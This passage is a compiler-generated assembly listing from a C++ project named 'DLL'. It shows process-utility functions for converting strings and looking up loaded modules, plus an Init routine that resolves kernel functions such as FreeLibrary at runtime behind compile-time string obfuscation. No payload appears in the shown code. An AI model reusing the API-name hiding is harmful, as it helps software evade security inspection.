; 23   : 	return std::string(_bstr_t(inp));

	mov	rax, rdi

; 24   : }

	mov	rbx, QWORD PTR [rsp+64]
	mov	rbp, QWORD PTR [rsp+72]
	mov	rsi, QWORD PTR [rsp+88]
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
$LN57@PWSTRToStr:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 324  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	npad	1
$LN56@PWSTRToStr:

; 694  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	int	3
$LN54@PWSTRToStr:
?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z ENDP ; ProcessUtilities::PWSTRToString
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
__$ReturnUdt$ = 64
inp$ = 72
$T1 = 80
$T2 = 80
?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA PROC ; `ProcessUtilities::PWSTRToString'::`1'::dtor$2
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 24
	mov	rcx, QWORD PTR $T1[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA ENDP ; `ProcessUtilities::PWSTRToString'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
__$ReturnUdt$ = 64
inp$ = 72
$T1 = 80
$T2 = 80
?dtor$0@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA PROC ; `ProcessUtilities::PWSTRToString'::`1'::dtor$0
	lea	rcx, QWORD PTR $T2[rdx]
	jmp	??1_bstr_t@@QEAA@XZ			; _bstr_t::~_bstr_t
?dtor$0@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA ENDP ; `ProcessUtilities::PWSTRToString'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
_Target$1 = 32
$T2 = 32
$T3 = 48
$T4 = 48
$T5 = 80
$T6 = 80
libName$GSCopy$ = 112
__$ArrayPad$ = 120
libName$ = 144
?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetLoadedLib, COMDAT

; 78   : HMODULE ProcessUtilities::GetLoadedLib(std::string libName) {

$LN239:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	mov	QWORD PTR [rsp+32], rsi
	push	rdi
	sub	rsp, 128				; 00000080H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rbx, rcx
	mov	QWORD PTR libName$GSCopy$[rsp], rcx

; 79   : 	if ( _loadedLibs.count(_lower(libName)) > 0 ) {

	mov	rdx, rcx
	lea	rcx, QWORD PTR $T6[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	mov	r10, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r8, QWORD PTR [rax+16]

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	rdx, rax

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN25@GetLoadedL

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rax]
$LN25@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdi, -3750763034362895579		; cbf29ce484222325H
	mov	r9, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	rbp, 1099511628211			; 00000100000001b3H
	test	r8, r8
	je	SHORT $LN36@GetLoadedL
	npad	6
$LL224@GetLoadedL:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+rcx]
	xor	r9, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r9, rbp

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rcx
	cmp	rcx, r8
	jb	SHORT $LL224@GetLoadedL
$LN36@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1246 :             return static_cast<bool>(_Find_last(_Keyval, _Hashval)._Duplicate);

	mov	r8, r10
	lea	rdx, QWORD PTR $T2[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	mov	rsi, QWORD PTR [rax+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T4[rsp+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN57@GetLoadedL

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T4[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN71@GetLoadedL

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN235@GetLoadedL
$LN71@GetLoadedL:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN57@GetLoadedL:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 79   : 	if ( _loadedLibs.count(_lower(libName)) > 0 ) {

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T5[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	test	rsi, rsi
	je	$LN2@GetLoadedL

; 80   : 		return _loadedLibs.at(_lower(libName));

	mov	rdx, rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	mov	r10, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r8, QWORD PTR [rax+16]

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	rdx, rax

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN94@GetLoadedL

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rax]
$LN94@GetLoadedL:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r8, r8
	je	SHORT $LN105@GetLoadedL
	npad	1
$LL226@GetLoadedL:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+rcx]
	xor	rdi, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdi, rbp

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rcx
	cmp	rcx, r8
	jb	SHORT $LL226@GetLoadedL
$LN105@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 437  :         const auto _Target = this->_Find_last(_Keyval, this->_Traitsobj(_Keyval));

	mov	r9, rdi
	mov	r8, r10
	lea	rdx, QWORD PTR _Target$1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >

; 438  :         if (_Target._Duplicate) {

	mov	rax, QWORD PTR _Target$1[rsp+8]
	test	rax, rax
	je	$LN79@GetLoadedL
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 80   : 		return _loadedLibs.at(_lower(libName));

	mov	rdi, QWORD PTR [rax+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T3[rsp+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN126@GetLoadedL

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T3[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN140@GetLoadedL

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN236@GetLoadedL
$LN140@GetLoadedL:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN126@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqu	XMMWORD PTR $T3[rsp+16], xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR $T3[rsp], 0

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN200@GetLoadedL

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN214@GetLoadedL

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN237@GetLoadedL
	jmp	SHORT $LN233@GetLoadedL
$LN2@GetLoadedL:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 83   : 	return GetModHandle(libName);

	mov	rcx, rax
	call	?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetModHandle
	mov	rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN200@GetLoadedL

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN214@GetLoadedL

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN211@GetLoadedL
$LN233@GetLoadedL:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 84   : }

	mov	rcx, r8
$LN214@GetLoadedL:
	call	??3@YAXPEAX_K@Z				; operator delete
$LN200@GetLoadedL:
	mov	rax, rdi
	mov	BYTE PTR [rbx], 0
	mov	QWORD PTR [rbx+24], 15
	mov	QWORD PTR [rbx+16], 0
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+128]
	mov	rbx, QWORD PTR [r11+24]
	mov	rbp, QWORD PTR [r11+32]
	mov	rsi, QWORD PTR [r11+40]
	mov	rsp, r11
	pop	rdi
	ret	0
$LN79@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 442  :         _Xout_of_range("invalid unordered_map<K, T> key");

	lea	rcx, OFFSET FLAT:??_C@_0CA@MMOGIFNF@invalid?5unordered_map?$DMK?0?5T?$DO?5key@
	call	?_Xout_of_range@std@@YAXPEBD@Z		; std::_Xout_of_range
	npad	1
$LN237@GetLoadedL:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN211@GetLoadedL:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN235@GetLoadedL:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN236@GetLoadedL:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN232@GetLoadedL:
?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::GetLoadedLib
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
_Target$1 = 32
$T2 = 32
$T3 = 48
$T4 = 48
$T5 = 80
$T6 = 80
libName$GSCopy$ = 112
__$ArrayPad$ = 120
libName$ = 144
?dtor$0@?0??GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetLoadedLib'::`1'::dtor$0
	mov	rcx, QWORD PTR libName$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0??GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetLoadedLib'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
_Target$1 = 32
$T2 = 32
$T3 = 48
$T4 = 48
$T5 = 80
$T6 = 80
libName$GSCopy$ = 112
__$ArrayPad$ = 120
libName$ = 144
?dtor$4@?0??GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::GetLoadedLib'::`1'::dtor$4
	lea	rcx, QWORD PTR $T3[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$4@?0??GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::GetLoadedLib'::`1'::dtor$4
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ PROC ; `ProcessUtilities::Init'::`2'::<lambda_1>::operator(), COMDAT

; 109  : 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN25@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+11], 389			; 00000185H
	mov	DWORD PTR [rbx], -531882599		; e04c1d99H
	mov	DWORD PTR [rbx+4], -1719457739		; 99832835H
	mov	WORD PTR [rbx+8], 7614			; 00001dbeH
	mov	BYTE PTR [rbx+10], 80			; 00000050H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 109  : 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN25@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
